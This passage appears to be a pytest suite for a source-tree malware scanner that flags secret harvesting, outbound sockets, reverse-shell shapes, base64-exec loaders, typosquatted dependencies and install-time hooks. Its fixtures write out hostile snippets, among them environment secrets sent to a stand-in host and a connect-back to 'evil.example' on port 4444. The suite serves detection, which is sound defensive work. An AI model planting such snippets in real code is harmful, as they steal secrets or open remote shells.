        b"    client.close()\n"
        b"def start():\n"
        b"    thread = threading.Thread(target=ping)\n"
        b"    thread.start()\n"
        b"    return fetch()\n",
    )
    report = artifact_scan.scan_source_tree(tmp_path)
    assert report.findings == (), report.detail


def test_env_enumeration_without_network_is_not_flagged(tmp_path: Path) -> None:
    _write(
        tmp_path,
        "settings.py",
        b"import os\n"
        b"def export():\n"
        b"    return {name: value for name, value in os.environ.items()}\n",
    )
    report = artifact_scan.scan_source_tree(tmp_path)
    assert [item for item in report.findings if item.kind == "env_secret_harvesting"] == []


def test_network_without_enumeration_is_not_flagged(tmp_path: Path) -> None:
    _write(
        tmp_path,
        "client.py",
        b"import os\n"
        b"import requests\n"
        b"URL = os.environ.get('SERVICE_URL', 'https://example.test')\n"
        b"def fetch():\n"
        b"    return requests.get(URL)\n",
    )
    report = artifact_scan.scan_source_tree(tmp_path)
    assert [item for item in report.findings if item.kind == "env_secret_harvesting"] == []


def test_environment_lookup_in_a_loop_plus_network_is_harvesting(tmp_path: Path) -> None:
    _write(
        tmp_path,
        "collect.py",
        b"import os\n"
        b"import socket\n"
        b"def collect():\n"
        b"    found = []\n"
        b"    for prefix in ('API', 'TOKEN', 'SECRET'):\n"
        b"        value = os.getenv(prefix + '_KEY')\n"
        b"        if value:\n"
        b"            found.append(value)\n"
        b"    client = socket.socket()\n"
        b"    client.connect(('203.0.113.10', 9001))\n"
        b"    client.sendall(str(found).encode())\n",
    )
    report = artifact_scan.scan_source_tree(tmp_path)
    assert [item.kind for item in report.findings].count("env_secret_harvesting") == 1


def test_raw_socket_egress_literal_host(tmp_path: Path) -> None:
    _write(
        tmp_path,
        "beacon.py",
        b"import socket\n"
        b"def beacon():\n"
        b"    client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n"
        b"    client.connect(('beacon.example.test', 4444))\n",
    )
    report = artifact_scan.scan_source_tree(tmp_path)
    findings = [item for item in report.findings if item.kind == "raw_socket_egress"]
    assert len(findings) == 1
    assert findings[0].severity == "high"
    assert "beacon.example.test" in findings[0].detail
    assert findings[0].line_no == 4


def test_raw_socket_egress_environment_host(tmp_path: Path) -> None:
    _write(
        tmp_path,
        "shell.py",
        b"import os\n"
        b"import socket\n"
        b"def connect_back():\n"
        b"    host = os.environ.get('TS_HOST', '127.0.0.1')\n"
        b"    client = socket.socket()\n"
        b"    client.connect((host, int(os.environ.get('TS_PORT', '4444'))))\n",
    )
    report = artifact_scan.scan_source_tree(tmp_path)
    findings = [item for item in report.findings if item.kind == "raw_socket_egress"]
    assert len(findings) == 1
    assert "os.environ" in findings[0].detail


def test_loopback_socket_client_is_not_egress(tmp_path: Path) -> None:
    _write(
        tmp_path,
        "local.py",
        b"import socket\n"
        b"def ping():\n"
        b"    client = socket.socket()\n"
        b"    client.connect(('127.0.0.1', 9000))\n",
    )
    report = artifact_scan.scan_source_tree(tmp_path)
    assert [item for item in report.findings if item.kind == "raw_socket_egress"] == []


def test_non_socket_connect_receiver_is_not_egress(tmp_path: Path) -> None:
    _write(
        tmp_path,
        "mixed.py",
        b"import socket\n"
        b"import sqlite3\n"
        b"def probe():\n"
        b"    socket.socket()\n"
        b"    sqlite3.connect('app.db')\n",
    )
    report = artifact_scan.scan_source_tree(tmp_path)
    assert [item for item in report.findings if item.kind == "raw_socket_egress"] == []


def test_reverse_shell_shape_with_shell_true(tmp_path: Path) -> None:
    _write(
        tmp_path,
        "reverse.py",
        b"import socket\n"
        b"import subprocess\n"
        b"def run():\n"
        b"    socket.socket()\n"
        b"    subprocess.Popen('whoami', shell=True)\n",
    )
    report = artifact_scan.scan_source_tree(tmp_path)
    findings = [item for item in report.findings if item.kind == "reverse_shell_shape"]
    assert len(findings) == 1
    assert findings[0].severity == "high"
    assert "shell=True" in findings[0].detail


def test_reverse_shell_shape_with_shell_literal(tmp_path: Path) -> None:
    _write(
        tmp_path,
        "reverse.py",
        b"import socket\n"
        b"import subprocess\n"
        b"def run():\n"
        b"    client = socket.socket()\n"
        b"    subprocess.Popen(['/bin/sh', '-i'])\n",
    )
    report = artifact_scan.scan_source_tree(tmp_path)
    findings = [item for item in report.findings if item.kind == "reverse_shell_shape"]
    assert len(findings) == 1
    assert "/bin/sh" in findings[0].detail


def test_lone_shell_call_is_not_reverse_shell(tmp_path: Path) -> None:
    _write(
        tmp_path,
        "tool.py",
        b"import subprocess\n"
        b"def run():\n"
        b"    subprocess.Popen('whoami', shell=True)\n",
    )
    report = artifact_scan.scan_source_tree(tmp_path)
    assert [item for item in report.findings if item.kind == "reverse_shell_shape"] == []
    assert [item for item in report.findings if item.kind == "dangerous_api"]


def test_obfuscated_payload_decoder_flow(tmp_path: Path) -> None:
    _write(
        tmp_path,
        "loader.py",
        b"import base64\n"
        b"def load(blob):\n"
        b"    code = base64.b64decode(blob)\n"
        b"    exec(code)\n",
    )
    report = artifact_scan.scan_source_tree(tmp_path)
    findings = [item for item in report.findings if item.kind == "obfuscated_payload"]
    assert len(findings) == 1
    assert findings[0].severity == "medium"
    assert "base64.b64decode()" in findings[0].detail


def test_obfuscated_payload_high_entropy_literal(tmp_path: Path) -> None:
    payload = "".join(chr(33 + (index * 7) % 90) for index in range(320))
    _write(tmp_path, "stage.py", ("def run():" + chr(10) + "    exec(" + repr(payload) + ")" + chr(10)).encode("utf-8"))
    report = artifact_scan.scan_source_tree(tmp_path)
    findings = [item for item in report.findings if item.kind == "obfuscated_payload"]
    assert len(findings) == 1
    assert findings[0].severity == "medium"
    assert "high-entropy literal" in findings[0].detail


def test_decoder_without_execution_is_not_flagged(tmp_path: Path) -> None:
    _write(
        tmp_path,
        "decode.py",
        b"import base64\n"
        b"def decode(blob):\n"
        b"    return base64.b64decode(blob).decode('utf-8')\n",
    )
    report = artifact_scan.scan_source_tree(tmp_path)
    assert [item for item in report.findings if item.kind == "obfuscated_payload"] == []


def test_new_rules_do_not_trigger_on_strings_or_comments(tmp_path: Path) -> None:
    source = (
        "DOC = \"os.environ.items() then socket.connect('evil.example') base64.b64decode exec\""
        + chr(10)
        + "# cmdclass = evil, subprocess.Popen('/bin/sh', shell=True) in a comment"
        + chr(10)
        + "TEXT = '''install_time_execution pyproject build-backend evil_backend'''"
        + chr(10)
        + "VALUE = 1"
        + chr(10)
    )
    report = _scan_source(tmp_path, source)
    assert report.findings == (), report.detail


def test_dependency_findings_are_folded_into_the_scan(tmp_path: Path) -> None:
    _write(tmp_path, "requirements.txt", b"reqeusts==2.0.0\nflask>=3.0.0\n")
    report = artifact_scan.scan_source_tree(tmp_path)
    findings = [item for item in report.findings if item.kind.startswith("dep_")]
    assert len(findings) == 1
    finding = findings[0]
    assert finding.kind == "dep_typosquat"
    assert finding.severity == "high"
    assert finding.rel_path == "requirements.txt"
    assert finding.line_no == 1
    assert finding.symbol == "reqeusts"
    assert "reqeusts" in finding.detail
    assert "declared dependency audit" in report.detail


def test_dependency_finding_is_suppressible(tmp_path: Path) -> None:
    _write(tmp_path, "requirements.txt", b"reqeusts==2.0.0\n")
    report = artifact_scan.scan_source_tree(tmp_path)
    finding = next(item for item in report.findings if item.kind == "dep_typosquat")
    store = suppress.SuppressionStore(tmp_path)
    key = suppress.FindingKey(finding.rel_path, finding.kind, finding.line_no, finding.symbol)
    assert store.add([key], "reviewed: internal clone of the dependency index, name is intentional") == 1
    reviewed = artifact_scan.scan_source_tree(tmp_path, suppress=store)
    assert reviewed.findings == ()
    assert reviewed.suppressed == 1
    assert "suppressed by review" in reviewed.detail


def test_two_thousand_file_tree_stays_inside_the_budget(tmp_path: Path) -> None:
    for index in range(2000):
        (tmp_path / f"module_{index:04d}.py").write_text("VALUE = " + str(index) + chr(10), encoding="utf-8")
    started = time.process_time()
    report = artifact_scan.scan_source_tree(tmp_path)
    elapsed = time.process_time() - started
    assert report.files_inspected == 2000
    assert report.truncated is False
    assert report.bytes_inspected > 0
    assert elapsed < 5.0, f"2000 file scan used {elapsed:.3f}s of CPU"

# ------------------------------------------------- quarantine eligibility

def test_artifact_finding_quarantine_default_is_false() -> None:
    finding = artifact_scan.ArtifactFinding("a.py", "dangerous_api", "high", "detail")
    assert finding.quarantine_eligible is False


def test_file_artifacts_are_quarantine_eligible(tmp_path: Path) -> None:
    _write(tmp_path, "cache.pkl", _malicious_pickle(tmp_path / "executed.txt"))
    source = tmp_path / "stale.py"
    source.write_text("VALUE = 1\n", encoding="utf-8")
    py_compile.compile(str(source), cfile=str(tmp_path / "stale.pyc"), doraise=True)
    source.write_text("VALUE = 1 + 100\n", encoding="utf-8")
    orphan_header = importlib.util.MAGIC_NUMBER + struct.pack("<I", 0) + b"\x00" * 8
    _write(tmp_path, "orphan.pyc", orphan_header)
    report = artifact_scan.scan_source_tree(tmp_path)
    eligible = {finding.kind: finding.quarantine_eligible for finding in report.findings}
    assert eligible["pickle_unsafe"] is True
    assert eligible["pyc_mismatch"] is True
    assert eligible["pyc_orphan"] is False


def test_code_and_dependency_findings_are_not_eligible(tmp_path: Path) -> None:
    _write(tmp_path, "api.py", b"import os\nos.system('ls')\n")
    _write(tmp_path, "requirements.txt", b"reqeusts==1.0\n")
    report = artifact_scan.scan_source_tree(tmp_path)
    by_kind = {finding.kind: finding.quarantine_eligible for finding in report.findings}
    assert by_kind["dangerous_api"] is False
    assert by_kind["dep_typosquat"] is False


def test_install_time_execution_is_quarantine_eligible(tmp_path: Path) -> None:
    _write(
        tmp_path,
        "setup.py",
        b"from setuptools import setup\n"
        b"setup(name='demo', version='1.0', cmdclass={'install': object})\n",
    )
    report = artifact_scan.scan_source_tree(tmp_path)
    finding = next(item for item in report.findings if item.kind == "install_time_execution")
    assert finding.quarantine_eligible is True


def test_behavioural_shapes_are_not_quarantine_eligible(tmp_path: Path) -> None:
    _write(
        tmp_path,
        "harvest.py",
        b"import os\n"
        b"import socket\n"
        b"def harvest():\n"
        b"    for name, value in os.environ.items():\n"
        b"        print(name)\n"
        b"    client = socket.socket()\n"
        b"    client.connect(('evil.example', 4444))\n",
    )
    report = artifact_scan.scan_source_tree(tmp_path)
    by_kind = {finding.kind: finding.quarantine_eligible for finding in report.findings}
    assert by_kind.get("env_secret_harvesting") is False
    assert by_kind.get("raw_socket_egress") is False